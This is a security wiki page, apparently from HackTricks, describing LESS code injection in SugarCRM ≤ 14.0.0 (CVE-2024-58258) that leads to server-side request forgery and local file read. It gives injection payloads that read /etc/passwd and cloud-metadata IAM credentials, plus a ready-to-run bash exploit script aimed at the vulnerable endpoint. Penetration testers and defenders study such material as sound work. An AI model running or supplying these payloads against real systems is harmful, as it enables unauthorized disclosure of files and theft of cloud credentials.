# LESS Code Injection leading to SSRF & Local File Read

{{#include ../../../banners/hacktricks-training.md}}

LESS is a popular CSS pre-processor that adds variables, mixins, functions and the powerful `@import` directive.  During compilation the LESS engine will **fetch the resources referenced in `@import`** statements and embed ("inline") their contents into the resulting CSS when the `(inline)` option is used.

When an application concatenates **user-controlled input** into a string that is later parsed by the LESS compiler, an attacker can **inject arbitrary LESS code**.  By abusing `@import (inline)` the attacker can force the server to retrieve:

* Local files via the `file://` protocol (information disclosure / Local File Inclusion).
* Remote resources on internal networks or cloud metadata services (SSRF).

This technique has been seen in real-world products such as **SugarCRM ≤ 14.0.0** (`/rest/v10/css/preview` endpoint).

### Exploitation

1. Identify a parameter that is directly embedded inside a stylesheet string processed by the LESS engine (e.g. `?lm=` in SugarCRM).
2. Close the current statement and inject new directives.  The most common primitives are:
   * `;`  – terminates the previous declaration.
   * `}`  – closes the previous block (if required).
3. Use `@import (inline) '<URL>';` to read arbitrary resources.
4. Optionally inject a **marker** (`data:` URI) after the import to ease extraction of the fetched content from the compiled CSS.

#### Local File Read

```
1; @import (inline) 'file:///etc/passwd';
@import (inline) 'data:text/plain,@@END@@'; //
```

The contents of `/etc/passwd` will appear in the HTTP response just before the `@@END@@` marker.

#### SSRF – Cloud Metadata

```
1; @import (inline) "http://169.254.169.254/latest/meta-data/iam/security-credentials/";
@import (inline) 'data:text/plain,@@END@@'; //
```

#### Automated PoC (SugarCRM example)

```bash
#!/usr/bin/env bash
# Usage: ./exploit.sh http://target/sugarcrm/ /etc/passwd

TARGET="$1"        # Base URL of SugarCRM instance
RESOURCE="$2"      # file:// path or URL to fetch

INJ=$(python -c "import urllib.parse,sys;print(urllib.parse.quote_plus(\"1; @import (inline) '$RESOURCE'; @import (inline) 'data:text/plain,@@END@@';//\"))")

curl -sk "${TARGET}rest/v10/css/preview?baseUrl=1&lm=${INJ}" | \
  sed -n 's/.*@@END@@\(.*\)/\1/p'
```

### Real-World Cases

| Product | Vulnerable Endpoint | Impact |
|---------|--------------------|--------|
| SugarCRM ≤ 14.0.0 | `/rest/v10/css/preview?lm=` | Unauthenticated SSRF & local file read |

### References

* [SugarCRM ≤ 14.0.0 (css/preview) LESS Code Injection Vulnerability](https://karmainsecurity.com/KIS-2025-04)
* [SugarCRM Security Advisory SA-2024-059](https://support.sugarcrm.com/resources/security/sugarcrm-sa-2024-059/)
* [CVE-2024-58258](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-58258)
{{#include ../../../banners/hacktricks-training.md}}
